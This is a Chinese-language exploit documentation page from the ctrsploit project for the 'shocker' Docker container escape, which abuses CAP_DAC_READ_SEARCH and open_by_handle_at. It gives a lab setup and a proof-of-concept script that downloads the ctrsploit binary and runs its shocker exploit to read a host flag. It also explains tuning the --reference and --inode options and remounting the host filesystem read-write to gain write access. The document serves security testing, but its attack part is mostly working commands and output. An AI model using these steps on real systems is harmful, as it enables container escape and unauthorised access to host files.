---

tags: sploit
author: ssst0n3
spec_version: v0.1.0
version: v0.1.0
changelog:
    - v0.1.0: init

---

# docker CAP_DAC_READ_SEARCH(shocker) 逃逸

[edit](https://github.com/ctrsploit/sploit-spec/edit/main/vul/shocker/README.md)

## 1. 漏洞介绍

拥有 CAP_DAC_READ_SEARCH 允许调用 open_by_handle_at 系统调用。该系统调用可以通过 inode number 打开文件系统下的文件。

## 2. 利用场景

利用容器的不安全配置逃逸

## 3. 前提条件

1. 拥有cap_dac_read_search

## 4. 漏洞存在性检查

`ctrsploit checksec shocker`

## 5. 漏洞复现

### 5.1 复现环境

shocker漏洞早已修复，下面以 [ssst0n3/docker_archive:shocker_docker-v26.1.4](https://github.com/ssst0n3/docker_archive/tree/main/vul/shocker/shocker_docker-v26.1.4) ,使用`--cap-add CAP_DAC_READ_SEARCH` 作为复现环境。

```
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd vul/shocker/shocker_docker-v26.1.4
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
$ ./ssh
root@localhost:~# docker version
Client: Docker Engine - Community
 Version:           26.1.4
 API version:       1.45
 Go version:        go1.21.11
 Git commit:        5650f9b
 Built:             Wed Jun  5 11:28:57 2024
 OS/Arch:           linux/amd64
 Context:           default

Server: Docker Engine - Community
 Engine:
  Version:          26.1.4
  API version:      1.45 (minimum version 1.24)
  Go version:       go1.21.11
  Git commit:       de5c9cf
  Built:            Wed Jun  5 11:28:57 2024
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.33
  GitCommit:        d2d58213f83a351ca8f528a95fbd145f5654e957
 runc:
  Version:          1.1.12
  GitCommit:        v1.1.12-0-g51d5e94
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
```

### 5.2 漏洞复现

启动存在不安全配置的容器。

```
root@ubuntu:~# docker run -ti --name poc --cap-add CAP_DAC_READ_SEARCH ubuntu
```

下载 ctrsploit 步骤略，在容器内发起逃逸攻击。

```
root@localhost:~# ./poc.sh 
+ wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O ctrsploit
+ chmod +x ctrsploit
+ docker run -tid --name poc --cap-add CAP_DAC_READ_SEARCH busybox
Unable to find image 'busybox:latest' locally
latest: Pulling from library/busybox
3d1a87f2317d: Pull complete 
Digest: sha256:82742949a3709938cbeb9cec79f5eaf3e48b255389f2dcedf2de29ef96fd841c
Status: Downloaded newer image for busybox:latest
c27f1b82f272b47100ad6d143d7b38dddf4d28f11b960949a7e60a62c2b56eba
+ docker cp ctrsploit poc:/usr/bin/
Successfully copied 10.6MB to poc:/usr/bin/
+ docker attach poc
/ # 
/ # 
/ # ctrsploit checksec shocker
[Y]  shocker	# Container escape with CAP_DAC_READ_SEARCH, alias shocker, found by Sebastian Krahmer (stealth) in 2014.

/ # ctrsploit exploit shocker
/proc/self/fd/7 # cat flag
flag{escaped}
```

## 6. 高级

### 6.1 `--reference` 

`reference` 参数与 OpenByHandleAt 系统调用的 mountFd 参数相关，该参数给定一个路径，用于在该路径所在的文件系统内打开 inode。

该参数默认为 `/etc/hosts` , 通常由 k8s 或 docker 等容器组件挂载进容器内。

需要通过该参数调整inode所属的文件系统。

例如以下案例， /etc/hosts 挂载自 `/dev/mapper/kubernetes`, 则 `--reference=/etc/hosts` 只能打开该文件系统下的inode。

```
$cat /proc/self/mountinfo |grep host
2297 2235 253:1 /containers/a70add2964af7d0891542a48578359192afcdb920c35260540c6d6da92fb1735/hostname /etc/hostname rw,nodev,noatime - ext4 /dev/mapper/docker rw,data=ordered
2299 2235 253:0 /pods/0255d349-f826-4f52-9e37-fbc65e085fc8/etc-hosts /etc/hosts rw,noatime - ext4 /dev/mapper/kubernetes rw,data=ordered
```

而通常 rootfs 位于类似 /dev/sda1 的文件系统， 则可尝试将指定 `--reference=/home/user/work` 。

```
$cat /proc/self/mountinfo |grep /dev/sd
2291 2235 8:1 / /home/user/work rw,relatime - ext4 /dev/sda1 rw,data=ordered
```

### 6.2 `--inode`

`inode` 参数指定目标文件/目录的 inode number。

* 如果目标是目录，则打开并chdir进入该目录；
* 如果目标不是目录，则显示stat信息，并尝试打开、读取内容。(文件内容如果过长，建议将ctrsploit输出结果重定向)

该参数默认为2 (每个文件系统的根目录的默认inode number)。

### 6.3 Read-only file system

有时成功逃逸到了主机的rootfs，但提示只读文件系统。

```
root@0d792b99e7e0:/proc/self/fd/7# ls
bin  boot  dev  etc  home  initrd.img  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz
root@0d792b99e7e0:/proc/self/fd/7# touch 1
touch: cannot touch '1': Read-only file system
```

这是因为 `--reference` 指定的文件是只读挂载进容器的。如需要写操作，可以在利用 shocker 漏洞前 `mount -o remount,rw` 重新挂载为 rw。或挑选rw挂载进容器的路径作为 `reference`。